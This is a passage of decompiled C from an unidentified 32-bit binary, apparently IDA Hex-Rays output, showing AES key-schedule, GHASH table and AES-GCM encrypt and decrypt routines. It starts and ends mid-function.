  return sub_40B540(a2, a1 + 1);
}
// 40B540: using guessed type int __fastcall sub_40B540(_DWORD, _DWORD);

//----- (0040B540) --------------------------------------------------------
__m128i __usercall sub_40B540@<xmm0>(__m128 a1@<xmm0>, __m128i a2@<xmm1>, __m128 a3@<xmm4>)
{
  __m128 v3; // xmm4
  __m128 v4; // xmm0

  v3 = _mm_shuffle_ps(a3, a1, 16);
  v4 = _mm_xor_ps(a1, v3);
  return _mm_xor_si128((__m128i)_mm_xor_ps(v4, _mm_shuffle_ps(v3, v4, 140)), _mm_shuffle_epi32(a2, 85));
}

//----- (0040B580) --------------------------------------------------------
void __usercall sub_40B580(__m128 *a1@<edx>, __m128 a2@<xmm0>, __m128 a3@<xmm2>, __m128 a4@<xmm5>)
{
  *a1 = _mm_shuffle_ps(a4, a2, 68);
  a1[1] = _mm_shuffle_ps(a2, a3, 78);
  JUMPOUT(0x40B543);
}
// 40B595: control flows out of bounds to 40B543

//----- (0040B6E0) --------------------------------------------------------
int __usercall sub_40B6E0@<eax>(_OWORD *a1@<edx>, __int128 a2@<xmm2>)
{
  *a1 = a2;
  return sub_40B6E6();
}
// 40B6E6: using guessed type int sub_40B6E6(void);

//----- (0040B6E6) --------------------------------------------------------
__m128 __usercall sub_40B6E6@<xmm0>(__m128 a1@<xmm0>, __m128 a2@<xmm1>, __m128 a3@<xmm4>)
{
  __m128 v3; // xmm4
  __m128 v4; // xmm0

  v3 = _mm_shuffle_ps(a3, a1, 16);
  v4 = _mm_xor_ps(a1, v3);
  return _mm_xor_ps(_mm_xor_ps(v4, _mm_shuffle_ps(v3, v4, 140)), _mm_shuffle_ps(a2, a2, 255));
}

//----- (0040B700) --------------------------------------------------------
void __usercall sub_40B700(_OWORD *a1@<edx>, __int128 a2@<xmm0>)
{
  *a1 = a2;
}

//----- (0040B800) --------------------------------------------------------
int __usercall sub_40B800@<eax>(__m128 a1@<xmm5>, int a2, int a3, __m128i *a4)
{
  return sub_40B2C0(a2, a4, a3, a1);
}

//----- (0040B820) --------------------------------------------------------
int __usercall sub_40B820@<eax>(__m128 a1@<xmm5>, int a2, int a3, __m128i *a4)
{
  int result; // eax
  int v5; // ecx
  int v6; // ecx
  __m128i *v7; // eax
  __m128i v8; // xmm1
  __m128i *v9; // edx
  __m128i *v10; // eax

  result = sub_40B2C0(a2, a4, a3, a1);
  v6 = v5;
  if ( !result )
  {
    v7 = &a4[v6 + 1];
    v8 = *v7;
    *v7 = *a4;
    *a4 = v8;
    v9 = a4 + 1;
    v10 = &a4[v6];
    do
    {
      _XMM0 = *v9;
      _XMM1 = *v10;
      __asm
      {
        aesimc  xmm0, xmm0
        aesimc  xmm1, xmm1
      }
      ++v9;
      --v10;
      v10[1] = _XMM0;
      v9[-1] = _XMM1;
    }
    while ( v10 > v9 );
    _XMM0 = *v9;
    __asm { aesimc  xmm0, xmm0 }
    *v9 = _XMM0;
    return 0;
  }
  return result;
}
// 40B835: variable 'v5' is possibly undefined

//----- (0040B940) --------------------------------------------------------
int __usercall sub_40B940@<eax>(unsigned int *a1@<edx>, int a2)
{
  int result; // eax
  unsigned int v3; // ecx
  unsigned int v4; // ebx
  unsigned int v5; // ebp
  unsigned int v6; // esi
  char v7; // dl
  unsigned int v8; // edi
  unsigned int v9; // ebp
  unsigned int v10; // ecx
  unsigned int v11; // edx
  unsigned int v12; // edx
  unsigned int v13; // ebx
  unsigned int v14; // ebp
  unsigned __int64 v15; // rdi
  int v16; // ebp
  unsigned int v17; // ecx
  int v18; // ecx
  int v19; // ebx
  int v20; // edx
  int v21; // ecx
  int v22; // ebp
  int v23; // edx
  int v24; // ecx
  int v25; // edx
  int v26; // ecx
  int v27; // ecx
  int v28; // edx
  int v29; // ecx
  int v30; // edx
  int v31; // ebp
  int v32; // ebx
  int v33; // ebp
  int v34; // ebx
  int v35; // ebp
  int v36; // ebx
  int v37; // ebp
  int v38; // edx
  int v39; // ebx
  int v40; // ecx
  int v41; // ebx
  int v42; // ebp
  int v43; // [esp+Ch] [ebp-40h]
  int v44; // [esp+10h] [ebp-3Ch]
  int v45; // [esp+1Ch] [ebp-30h]
  int v46; // [esp+20h] [ebp-2Ch]
  int v47; // [esp+24h] [ebp-28h]
  int v48; // [esp+28h] [ebp-24h]
  int v49; // [esp+2Ch] [ebp-20h]
  int v50; // [esp+30h] [ebp-1Ch]
  int v51; // [esp+38h] [ebp-14h]
  unsigned int v52; // [esp+40h] [ebp-Ch]
  int v53; // [esp+40h] [ebp-Ch]
  int v54; // [esp+48h] [ebp-4h]

  result = a2;
  *(_DWORD *)a2 = 0;
  *(_DWORD *)(a2 + 4) = 0;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *a1;
  v4 = a1[3];
  v5 = a1[2];
  v6 = a1[1];
  *(_DWORD *)(a2 + 128) = *a1;
  *(_DWORD *)(a2 + 132) = v6;
  *(_DWORD *)(a2 + 136) = v5;
  v7 = v5;
  v8 = __PAIR64__(v4, v5) >> 1;
  v9 = __PAIR64__(v6, v3) >> 1;
  *(_DWORD *)(a2 + 140) = v4;
  v10 = (v4 >> 1) | (v3 << 31);
  v11 = (v6 >> 1) ^ -(v7 & 1) & 0xE1000000;
  *(_DWORD *)(a2 + 64) = v9;
  *(_DWORD *)(a2 + 68) = v11;
  v52 = v11;
  *(_DWORD *)(a2 + 72) = v8;
  *(_DWORD *)(a2 + 76) = v10;
  LOBYTE(v6) = v8;
  v15 = __PAIR64__(v6, __PAIR64__(v10, v8) >> 1) & 0x1FFFFFFFFi64;
  v12 = (v10 >> 1) | (v9 << 31);
  v13 = __PAIR64__(v52, v9) >> 1;
  v14 = v15;
  LODWORD(v15) = v13;
  HIDWORD(v15) = (v52 >> 1) ^ -HIDWORD(v15) & 0xE1000000;
  *(_QWORD *)(a2 + 32) = __PAIR64__(HIDWORD(v15), v13);
  *(_DWORD *)(a2 + 40) = v14;
  LOBYTE(v10) = v14;
  v16 = __PAIR64__(v12, v14) >> 1;
  *(_DWORD *)(a2 + 44) = v12;
  LODWORD(v15) = v15 >> 1;
  v54 = (v12 >> 1) | (v13 << 31);
  v17 = (HIDWORD(v15) >> 1) ^ -(v10 & 1) & 0xE1000000;
  HIDWORD(v15) = *(_DWORD *)(a2 + 36);
  *(_DWORD *)(a2 + 16) = v15;
  *(_DWORD *)(a2 + 20) = v17;
  *(_DWORD *)(a2 + 24) = v16;
  v51 = HIDWORD(v15);
  HIDWORD(v15) ^= v17;
  v18 = *(_DWORD *)(a2 + 40);
  *(_DWORD *)(a2 + 28) = v54;
  v19 = *(_DWORD *)(a2 + 32);
  *(_DWORD *)(a2 + 52) = HIDWORD(v15);
  v53 = *(_DWORD *)(a2 + 20);
  v44 = *(_DWORD *)(a2 + 44);
  v43 = v18;
  *(_DWORD *)(a2 + 60) = v54 ^ v44;
  v20 = *(_DWORD *)(a2 + 24);
  *(_DWORD *)(a2 + 84) = *(_DWORD *)(a2 + 68) ^ v53;
  v46 = *(_DWORD *)(a2 + 28);
  v21 = v16 ^ v18;
  v22 = *(_DWORD *)(a2 + 16);
  *(_DWORD *)(a2 + 92) = *(_DWORD *)(a2 + 76) ^ v46;
  HIDWORD(v15) = *(_DWORD *)(a2 + 68) ^ v51;
  *(_DWORD *)(a2 + 48) = v15 ^ v19;
  *(_DWORD *)(a2 + 100) = HIDWORD(v15);
  v45 = v20;
  v23 = *(_DWORD *)(a2 + 72) ^ v20;
  *(_DWORD *)(a2 + 104) = *(_DWORD *)(a2 + 72) ^ v43;
  HIDWORD(v15) = *(_DWORD *)(a2 + 48);
  *(_DWORD *)(a2 + 56) = v21;
  v24 = *(_DWORD *)(a2 + 64);
  LODWORD(v15) = v24 ^ v22;
  *(_DWORD *)(a2 + 88) = v23;
  v47 = HIDWORD(v15);
  HIDWORD(v15) ^= v24;
  v25 = v24 ^ v19;
  v26 = *(_DWORD *)(a2 + 56);
  *(_DWORD *)(a2 + 80) = v15;
  v49 = v26;
  v27 = *(_DWORD *)(a2 + 72) ^ v26;
  *(_DWORD *)(a2 + 96) = v25;
  v28 = *(_DWORD *)(a2 + 76);
  *(_DWORD *)(a2 + 112) = HIDWORD(v15);
  HIDWORD(v15) = *(_DWORD *)(a2 + 60);
  *(_DWORD *)(a2 + 120) = v27;
  v29 = *(_DWORD *)(a2 + 128);
  *(_DWORD *)(a2 + 108) = v28 ^ v44;
  v50 = HIDWORD(v15);
  HIDWORD(v15) ^= v28;
  v30 = *(_DWORD *)(a2 + 132);
  v48 = *(_DWORD *)(a2 + 52);
  *(_DWORD *)(a2 + 116) = *(_DWORD *)(a2 + 68) ^ v48;
  LODWORD(v15) = *(_DWORD *)(a2 + 140);
  *(_DWORD *)(a2 + 124) = HIDWORD(v15);
  HIDWORD(v15) = *(_DWORD *)(a2 + 136);
  *(_DWORD *)(a2 + 144) = v29 ^ v22;
  *(_DWORD *)(a2 + 148) = v30 ^ v53;
  *(_DWORD *)(a2 + 152) = HIDWORD(v15) ^ v45;
  *(_DWORD *)(a2 + 156) = v15 ^ v46;
  *(_DWORD *)(a2 + 164) = v30 ^ v51;
  *(_DWORD *)(a2 + 160) = v29 ^ v19;
  *(_DWORD *)(a2 + 172) = v15 ^ v44;
  *(_DWORD *)(a2 + 168) = HIDWORD(v15) ^ v43;
  *(_DWORD *)(a2 + 180) = v30 ^ v48;
  *(_DWORD *)(a2 + 176) = v29 ^ v47;
  *(_DWORD *)(a2 + 188) = v15 ^ v50;
  *(_DWORD *)(a2 + 184) = HIDWORD(v15) ^ v49;
  v31 = *(_DWORD *)(a2 + 68) ^ v30;
  *(_DWORD *)(a2 + 192) = *(_DWORD *)(a2 + 64) ^ v29;
  v32 = *(_DWORD *)(a2 + 72);
  *(_DWORD *)(a2 + 196) = v31;
  *(_DWORD *)(a2 + 204) = v15 ^ *(_DWORD *)(a2 + 76);
  v33 = *(_DWORD *)(a2 + 84);
  *(_DWORD *)(a2 + 200) = HIDWORD(v15) ^ v32;
  v34 = v29 ^ *(_DWORD *)(a2 + 80);
  *(_DWORD *)(a2 + 212) = v30 ^ v33;
  *(_DWORD *)(a2 + 208) = v34;
  v35 = *(_DWORD *)(a2 + 92) ^ v15;
  *(_DWORD *)(a2 + 216) = *(_DWORD *)(a2 + 88) ^ HIDWORD(v15);
  v36 = *(_DWORD *)(a2 + 96);
  *(_DWORD *)(a2 + 220) = v35;
  v37 = v30 ^ *(_DWORD *)(a2 + 100);
  v38 = *(_DWORD *)(a2 + 116) ^ v30;
  v39 = v29 ^ v36;
  v40 = *(_DWORD *)(a2 + 112) ^ v29;
  *(_DWORD *)(a2 + 228) = v37;
  *(_DWORD *)(a2 + 224) = v39;
  v41 = *(_DWORD *)(a2 + 104) ^ HIDWORD(v15);
  v42 = *(_DWORD *)(a2 + 108) ^ v15;
  LODWORD(v15) = *(_DWORD *)(a2 + 124) ^ v15;
  *(_DWORD *)(a2 + 248) = *(_DWORD *)(a2 + 120) ^ HIDWORD(v15);
  *(_DWORD *)(a2 + 252) = v15;
  *(_DWORD *)(a2 + 236) = v42;
  *(_DWORD *)(a2 + 232) = v41;
  *(_DWORD *)(a2 + 240) = v40;
  *(_DWORD *)(a2 + 244) = v38;
  return result;
}

//----- (0040BC80) --------------------------------------------------------
const __m128i *__cdecl sub_40BC80(__m128i *a1, int a2, void (__cdecl *a3)(__m128i *, __m128i *, int))
{
  unsigned int v3; // ecx
  unsigned int v4; // edx
  unsigned __int32 v5; // eax
  const __m128i *result; // eax

  memset(a1, 0, 0x178u);
  a1[23].m128i_i32[0] = (__int32)a3;
  a1[23].m128i_i32[1] = a2;
  a3(a1 + 5, a1 + 5, a2);
  v3 = a1[5].m128i_u32[1];
  v4 = a1[5].m128i_u32[2];
  a1[5].m128i_i32[1] = _byteswap_ulong(a1[5].m128i_u32[0]);
  v5 = _byteswap_ulong(a1[5].m128i_u32[3]);
  a1[5].m128i_i32[0] = _byteswap_ulong(v3);
  a1[5].m128i_i32[2] = v5;
  a1[5].m128i_i32[3] = _byteswap_ulong(v4);
  if ( (dword_73C6D0 & 0x1000000) != 0 && (dword_73C6D4 & 2) != 0 )
  {
    result = sub_426050(a1 + 6, a1 + 5);
    a1[22].m128i_i32[0] = (__int32)sub_426170;
    a1[22].m128i_i32[1] = (__int32)sub_426240;
  }
  else
  {
    result = (const __m128i *)sub_40B940((unsigned int *)&a1[5], (int)a1[6].m128i_i32);
    if ( (dword_73C6D0 & 0x2000000) != 0 )
    {
      a1[22].m128i_i32[0] = (__int32)sub_425600;
      a1[22].m128i_i32[1] = (__int32)sub_425740;
    }
    else
    {
      a1[22].m128i_i32[0] = (__int32)sub_425300;
      a1[22].m128i_i32[1] = (__int32)sub_425460;
    }
  }
  return result;
}
// 73C6D0: using guessed type int dword_73C6D0;
// 73C6D4: using guessed type int dword_73C6D4;

//----- (0040BD70) --------------------------------------------------------
int __cdecl sub_40BD70(int a1, _DWORD *a2, unsigned int a3)
{
  unsigned int v3; // ebx
  unsigned __int32 v5; // edi
  unsigned int v6; // eax
  char *v7; // edi
  _BYTE *v8; // ecx
  _BYTE *v9; // eax
  int v10; // ebp
  _BYTE *v11; // eax
  unsigned int v12; // edi
  int result; // eax
  void (__cdecl *v15)(int, int); // [esp+18h] [ebp+4h]
  unsigned int v16; // [esp+20h] [ebp+Ch]

  v3 = a3;
  v15 = *(void (__cdecl **)(int, int))(a1 + 352);
  *(_DWORD *)a1 = 0;
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_DWORD *)(a1 + 64) = 0;
  *(_DWORD *)(a1 + 68) = 0;
  *(_DWORD *)(a1 + 72) = 0;
  *(_DWORD *)(a1 + 76) = 0;
  *(_DWORD *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 52) = 0;
  *(_DWORD *)(a1 + 56) = 0;
  *(_DWORD *)(a1 + 60) = 0;
  *(_DWORD *)(a1 + 364) = 0;
  *(_DWORD *)(a1 + 360) = 0;
  if ( a3 == 12 )
  {
    *(_DWORD *)a1 = *a2;
    *(_DWORD *)(a1 + 4) = a2[1];
    *(_DWORD *)(a1 + 8) = a2[2];
    *(_BYTE *)(a1 + 15) = 1;
    v5 = 1;
  }
  else
  {
    v6 = a3;
    if ( a3 >= 0x10 )
    {
      v7 = (char *)a2 - a1;
      v16 = a3 >> 4;
      do
      {
        v8 = (char *)a2 + 2;
        v9 = (_BYTE *)a1;
        v10 = 4;
        do
        {
          *v9 ^= v9[(_DWORD)v7];
          v9[1] ^= *(v8 - 1);
          v9[2] ^= *v8;
          v9[3] ^= v8[1];
          v9 += 4;
          v8 += 4;
          --v10;
        }
        while ( v10 );
        ((void (__thiscall *)(_BYTE *, int, int))v15)(v8, a1, a1 + 96);
        a2 += 4;
        v7 += 16;
        v3 -= 16;
        --v16;
      }
      while ( v16 );
      v6 = a3;
    }
    if ( v3 )
    {
      v11 = (_BYTE *)a1;
      v12 = v3;
      do
      {
        *v11 ^= *((_BYTE *)a2 + (_DWORD)v11 - a1);
        ++v11;
        --v12;
      }
      while ( v12 );
      v15(a1, a1 + 96);
      v6 = a3;
    }
    *(_DWORD *)(a1 + 8) ^= _byteswap_ulong((unsigned __int64)v6 >> 29);
    *(_DWORD *)(a1 + 12) ^= _byteswap_ulong(8 * v6);
    v15(a1, a1 + 96);
    v5 = _byteswap_ulong(*(_DWORD *)(a1 + 12));
  }
  result = (*(int (__cdecl **)(int, int, _DWORD))(a1 + 368))(a1, a1 + 32, *(_DWORD *)(a1 + 372));
  *(_DWORD *)(a1 + 12) = _byteswap_ulong(v5 + 1);
  return result;
}
// 40BE5E: conditional instruction was optimized away because ebx.4!=0

//----- (0040BEE0) --------------------------------------------------------
int __cdecl sub_40BEE0(int a1, _BYTE *a2, unsigned int a3)
{
  bool v4; // zf
  void (__cdecl *v5)(int, int); // edx
  unsigned int v7; // ebx
  unsigned __int64 v8; // kr00_8
  int v10; // edi
  unsigned int v11; // eax
  unsigned int v12; // [esp+4h] [ebp-4h]
  void (__cdecl *v13)(int, int, _BYTE *, unsigned int); // [esp+Ch] [ebp+4h]

  v4 = *(_QWORD *)(a1 + 56) == 0i64;
  v5 = *(void (__cdecl **)(int, int))(a1 + 352);
  v13 = *(void (__cdecl **)(int, int, _BYTE *, unsigned int))(a1 + 356);
  if ( !v4 )
    return -2;
  v7 = a3;
  v8 = *(_QWORD *)(a1 + 48) + a3;
  if ( v8 > 0x2000000000000000i64 )
    return -1;
  v10 = *(_DWORD *)(a1 + 364);
  *(_QWORD *)(a1 + 48) = v8;
  if ( v10 )
  {
    while ( v7 )
    {
      *(_BYTE *)(v10 + a1 + 64) ^= *a2++;
      --v7;
      v10 = ((_BYTE)v10 + 1) & 0xF;
      if ( !v10 )
      {
        v5(a1 + 64, a1 + 96);
        goto LABEL_9;
      }
    }
  }
  else
  {
LABEL_9:
    v12 = v7 & 0xFFFFFFF0;
    if ( (v7 & 0xFFFFFFF0) != 0 )
    {
      v13(a1 + 64, a1 + 96, a2, v7 & 0xFFFFFFF0);
      a2 += v12;
      v7 -= v12;
    }
    if ( v7 )
    {
      v11 = 0;
      v10 = v7;
      do
      {
        *(_BYTE *)(a1 + v11 + 64) ^= a2[v11];
        ++v11;
      }
      while ( v11 < v7 );
    }
  }
  *(_DWORD *)(a1 + 364) = v10;
  return 0;
}
// 40BF67: conditional instruction was optimized away because edi.4!=0

//----- (0040BFD0) --------------------------------------------------------
int __cdecl sub_40BFD0(int a1, int a2, _BYTE *a3, unsigned int a4)
{
  void (__cdecl *v5)(int, int); // edx
  unsigned __int64 v6; // kr00_8
  bool v7; // zf
  int v8; // ecx
  unsigned int v11; // ebp
  char v12; // al
  unsigned int v13; // edx
  int v14; // ecx
  unsigned int v15; // eax
  int v16; // edx
  _BYTE *v17; // edx
  int v18; // ebx
  char v19; // al
  int v21; // [esp+4h] [ebp-14h]
  void (__cdecl *v22)(int, int, int); // [esp+8h] [ebp-10h]
  int v23; // [esp+Ch] [ebp-Ch]
  unsigned int v24; // [esp+Ch] [ebp-Ch]
  void (__cdecl *v25)(int, int); // [esp+10h] [ebp-8h]
  unsigned int v26; // [esp+10h] [ebp-8h]
  unsigned int v27; // [esp+10h] [ebp-8h]
  void (__cdecl *v28)(int, int, _BYTE *, int); // [esp+14h] [ebp-4h]
  int v29; // [esp+1Ch] [ebp+4h]

  v5 = *(void (__cdecl **)(int, int))(a1 + 352);
  v22 = *(void (__cdecl **)(int, int, int))(a1 + 368);
  v21 = *(_DWORD *)(a1 + 372);
  v28 = *(void (__cdecl **)(int, int, _BYTE *, int))(a1 + 356);
  v25 = v5;
  v6 = a4 + *(_QWORD *)(a1 + 56);
  if ( v6 > 0xFFFFFFFE0i64 )
    return -1;
  v7 = *(_DWORD *)(a1 + 364) == 0;
  *(_QWORD *)(a1 + 56) = v6;
  if ( !v7 )
  {
    v5(a1 + 64, a1 + 96);
    *(_DWORD *)(a1 + 364) = 0;
  }
  v8 = *(_DWORD *)(a1 + 360);
  v11 = _byteswap_ulong(*(_DWORD *)(a1 + 12));
  v29 = v8;
  if ( v8 )
  {
    while ( a4 )
    {
      v12 = *(_BYTE *)a2 ^ *(_BYTE *)(v8 + a1 + 16);
      --a4;
      *a3 = v12;
      *(_BYTE *)(v8 + a1 + 64) ^= v12;
      ++a3;
      ++a2;
      v29 = ((_BYTE)v8 + 1) & 0xF;
      if ( (((_BYTE)v8 + 1) & 0xF) == 0 )
        goto LABEL_11;
      v8 = ((_BYTE)v8 + 1) & 0xF;
    }
    if ( v8 )
      goto LABEL_27;
LABEL_11:
    v25(a1 + 64, a1 + 96);
    v8 = v29;
  }
  v13 = a4;
  if ( a4 >= 0xC00 )
  {
    v26 = a4 / 0xC00;
    do
    {
      v23 = 192;
      do
      {
        v22(a1, a1 + 16, v21);
        *(_DWORD *)(a1 + 12) = _byteswap_ulong(++v11);
        *(_DWORD *)a3 = *(_DWORD *)a2 ^ *(_DWORD *)(a1 + 16);
        a3 += 16;
        *((_DWORD *)a3 - 3) = *(_DWORD *)(a1 + 20) ^ *(_DWORD *)(a2 + 4);
        v14 = *(_DWORD *)(a1 + 24) ^ *(_DWORD *)(a2 + 8);
        a2 += 16;
        *((_DWORD *)a3 - 2) = v14;
        v7 = v23-- == 1;
        *((_DWORD *)a3 - 1) = *(_DWORD *)(a1 + 28) ^ *(_DWORD *)(a2 - 4);
      }
      while ( !v7 );
      v28(a1 + 64, a1 + 96, a3 - 3072, 3072);
      a4 -= 3072;
      --v26;
    }
    while ( v26 );
    v8 = v29;
    v13 = a4;
  }
  v15 = v13 & 0xFFFFFFF0;
  v24 = v13 & 0xFFFFFFF0;
  if ( (v13 & 0xFFFFFFF0) != 0 )
  {
    if ( v13 >= 0x10 )
    {
      v27 = v13 >> 4;
      do
      {
        v22(a1, a1 + 16, v21);
        ++v11;
        a4 -= 16;
        *(_DWORD *)(a1 + 12) = _byteswap_ulong(v11);
        *(_DWORD *)a3 = *(_DWORD *)a2 ^ *(_DWORD *)(a1 + 16);
        a3 += 16;
        *((_DWORD *)a3 - 3) = *(_DWORD *)(a1 + 20) ^ *(_DWORD *)(a2 + 4);
        v16 = *(_DWORD *)(a1 + 24) ^ *(_DWORD *)(a2 + 8);
        a2 += 16;
        *((_DWORD *)a3 - 2) = v16;
        v7 = v27-- == 1;
        *((_DWORD *)a3 - 1) = *(_DWORD *)(a1 + 28) ^ *(_DWORD *)(a2 - 4);
      }
      while ( !v7 );
      v15 = v24;
    }
    v28(a1 + 64, a1 + 96, &a3[-v15], v15);
    v8 = v29;
    v13 = a4;
  }
  if ( v13 )
  {
    v22(a1, a1 + 16, v21);
    v8 = v29;
    *(_DWORD *)(a1 + 12) = _byteswap_ulong(v11 + 1);
    v17 = &a3[v29];
    v18 = a2 - (_DWORD)a3;
    do
    {
      v19 = v17[v18] ^ *(_BYTE *)(a1 + v8 + 16);
      *v17 = v19;
      *(_BYTE *)(a1 + v8++ + 64) ^= v19;
      ++v17;
      --a4;
    }
    while ( a4 );
  }
LABEL_27:
  *(_DWORD *)(a1 + 360) = v8;
  return 0;
}

//----- (0040C240) --------------------------------------------------------
int __cdecl sub_40C240(int a1, char *a2, _BYTE *a3, unsigned int a4)
{
  void (__cdecl *v5)(int, int); // edx
  unsigned __int64 v6; // kr00_8
  bool v7; // zf
  int v8; // eax
  unsigned int v11; // ebp
  char v12; // cl
  int v13; // eax
  int v14; // edx
  _BYTE *v15; // ebp
  int v16; // edi
  char v17; // cl
  char v18; // bl
  int v20; // [esp+4h] [ebp-14h]
  void (__cdecl *v21)(int, int, int); // [esp+8h] [ebp-10h]
  int v22; // [esp+Ch] [ebp-Ch]
  void (__cdecl *v23)(int, int); // [esp+10h] [ebp-8h]
  unsigned int v24; // [esp+10h] [ebp-8h]
  void (__cdecl *v25)(int, int, char *, int); // [esp+14h] [ebp-4h]
  unsigned int v26; // [esp+14h] [ebp-4h]
  int v27; // [esp+1Ch] [ebp+4h]

  v5 = *(void (__cdecl **)(int, int))(a1 + 352);
  v21 = *(void (__cdecl **)(int, int, int))(a1 + 368);
  v20 = *(_DWORD *)(a1 + 372);
  v25 = *(void (__cdecl **)(int, int, char *, int))(a1 + 356);
  v23 = v5;
  v6 = a4 + *(_QWORD *)(a1 + 56);
  if ( v6 > 0xFFFFFFFE0i64 )
    return -1;
  v7 = *(_DWORD *)(a1 + 364) == 0;
  *(_QWORD *)(a1 + 56) = v6;
  if ( !v7 )
  {
    v5(a1 + 64, a1 + 96);
    *(_DWORD *)(a1 + 364) = 0;
  }
  v8 = *(_DWORD *)(a1 + 360);
  v11 = _byteswap_ulong(*(_DWORD *)(a1 + 12));
  v27 = v8;
  if ( v8 )
  {
    while ( a4 )
    {
      v12 = *a2;
      --a4;
      *a3 = *a2 ^ *(_BYTE *)(v8 + a1 + 16);
      *(_BYTE *)(v8 + a1 + 64) ^= v12;
      ++a2;
      ++a3;
      v27 = ((_BYTE)v8 + 1) & 0xF;
      if ( (((_BYTE)v8 + 1) & 0xF) == 0 )
        goto LABEL_11;
      v8 = ((_BYTE)v8 + 1) & 0xF;
    }
    if ( v8 )
      goto LABEL_26;
LABEL_11:
    v23(a1 + 64, a1 + 96);
    v8 = v27;
  }
  if ( a4 >= 0xC00 )
  {
    v24 = a4 / 0xC00;
    do
    {
      v25(a1 + 64, a1 + 96, a2, 3072);
      v22 = 192;
      do
      {
        v21(a1, a1 + 16, v20);
        *(_DWORD *)(a1 + 12) = _byteswap_ulong(++v11);
        *(_DWORD *)a3 = *(_DWORD *)(a1 + 16) ^ *(_DWORD *)a2;
        a3 += 16;
        *((_DWORD *)a3 - 3) = *(_DWORD *)(a1 + 20) ^ *((_DWORD *)a2 + 1);
        v13 = *(_DWORD *)(a1 + 24) ^ *((_DWORD *)a2 + 2);
        a2 += 16;
        *((_DWORD *)a3 - 2) = v13;
        v7 = v22-- == 1;
        *((_DWORD *)a3 - 1) = *(_DWORD *)(a1 + 28) ^ *((_DWORD *)a2 - 1);
      }
      while ( !v7 );
      a4 -= 3072;
      --v24;
    }
    while ( v24 );
    v8 = v27;
  }
  if ( (a4 & 0xFFFFFFF0) != 0 )
  {
    v25(a1 + 64, a1 + 96, a2, a4 & 0xFFFFFFF0);
    if ( a4 >= 0x10 )
    {
      v26 = a4 >> 4;
      do
      {
        v21(a1, a1 + 16, v20);
        ++v11;
        a4 -= 16;
        *(_DWORD *)(a1 + 12) = _byteswap_ulong(v11);
        *(_DWORD *)a3 = *(_DWORD *)(a1 + 16) ^ *(_DWORD *)a2;
        a3 += 16;
        *((_DWORD *)a3 - 3) = *(_DWORD *)(a1 + 20) ^ *((_DWORD *)a2 + 1);
        v14 = *(_DWORD *)(a1 + 24) ^ *((_DWORD *)a2 + 2);
        a2 += 16;
        *((_DWORD *)a3 - 2) = v14;
        v7 = v26-- == 1;
        *((_DWORD *)a3 - 1) = *(_DWORD *)(a1 + 28) ^ *((_DWORD *)a2 - 1);
      }
      while ( !v7 );
    }
    v8 = v27;
  }
  if ( a4 )
  {
    v21(a1, a1 + 16, v20);
    v8 = v27;
    *(_DWORD *)(a1 + 12) = _byteswap_ulong(v11 + 1);
    v15 = &a3[v27];
    v16 = a2 - a3;
    do
    {
      v17 = v15[v16];
      v18 = *(_BYTE *)(a1 + v8 + 16);
      *(_BYTE *)(a1 + v8 + 64) ^= v17;
      *v15 = v17 ^ v18;
      ++v8;
      ++v15;
      --a4;
    }
    while ( a4 );
  }
LABEL_26:
  *(_DWORD *)(a1 + 360) = v8;
  return 0;
}

//----- (0040C4A0) --------------------------------------------------------
int __cdecl sub_40C4A0(
        int a1,
        _BYTE *a2,
        _BYTE *a3,
        unsigned int a4,
        void (__cdecl *a5)(_BYTE *, _BYTE *, int, int, int))
{
  void (__cdecl *v6)(int, int); // edx
  unsigned __int64 v7; // kr00_8
  bool v8; // zf
  int v9; // ebx
  unsigned int v11; // ebp
  char v12; // al
  unsigned int v13; // ecx
  unsigned int v14; // eax
  _BYTE *v15; // ecx
  char v16; // al
  void (__cdecl *v18)(int, int); // [esp+4h] [ebp-Ch]
  unsigned int v19; // [esp+4h] [ebp-Ch]
  unsigned int v20; // [esp+4h] [ebp-Ch]
  void (__cdecl *v21)(int, int, _BYTE *, int); // [esp+8h] [ebp-8h]
  unsigned int v22; // [esp+Ch] [ebp-4h]
  int v23; // [esp+14h] [ebp+4h]

  v6 = *(void (__cdecl **)(int, int))(a1 + 352);
  v21 = *(void (__cdecl **)(int, int, _BYTE *, int))(a1 + 356);
  v23 = *(_DWORD *)(a1 + 372);
  v18 = v6;
  v7 = a4 + *(_QWORD *)(a1 + 56);
  if ( v7 > 0xFFFFFFFE0i64 )
    return -1;
  v8 = *(_DWORD *)(a1 + 364) == 0;
  *(_QWORD *)(a1 + 56) = v7;
  if ( !v8 )
  {
    v6(a1 + 64, a1 + 96);
    *(_DWORD *)(a1 + 364) = 0;
  }
  v9 = *(_DWORD *)(a1 + 360);
  v11 = _byteswap_ulong(*(_DWORD *)(a1 + 12));
  if ( v9 )
  {
    while ( a4 )
    {
      v12 = *a2 ^ *(_BYTE *)(v9 + a1 + 16);
      --a4;
      *a3 = v12;
      *(_BYTE *)(v9 + a1 + 64) ^= v12;
      ++a3;
      v9 = ((_BYTE)v9 + 1) & 0xF;
      ++a2;
      if ( !v9 )
      {
        v18(a1 + 64, a1 + 96);
        goto LABEL_9;
      }
    }
  }
  else
  {
LABEL_9:
    v13 = a4;
    if ( a4 >= 0xC00 )
    {
      v19 = a4 / 0xC00;
      do
      {
        a5(a2, a3, 192, v23, a1);
        v11 += 192;
        *(_DWORD *)(a1 + 12) = _byteswap_ulong(v11);
        v21(a1 + 64, a1 + 96, a3, 3072);
        a2 += 3072;
        a4 -= 3072;
        a3 += 3072;
        --v19;
      }
      while ( v19 );
      v13 = a4;
    }
    v14 = v13 & 0xFFFFFFF0;
    v20 = v13 & 0xFFFFFFF0;
    if ( (v13 & 0xFFFFFFF0) != 0 )
    {
      v22 = v14 >> 4;
      a5(a2, a3, v14 >> 4, v23, a1);
      v11 += v22;
      *(_DWORD *)(a1 + 12) = _byteswap_ulong(v11);
      a2 += v20;
      a4 -= v20;
      v21(a1 + 64, a1 + 96, a3, v20);
      v13 = a4;
      a3 += v20;
    }
    if ( v13 )
    {
      (*(void (__cdecl **)(int, int, int))(a1 + 368))(a1, a1 + 16, v23);
      *(_DWORD *)(a1 + 12) = _byteswap_ulong(v11 + 1);
      v15 = &a3[v9];
      do
      {
        v16 = v15[a2 - a3] ^ *(_BYTE *)(a1 + v9 + 16);
        *v15 = v16;
        *(_BYTE *)(a1 + v9++ + 64) ^= v16;
        ++v15;
        --a4;
      }
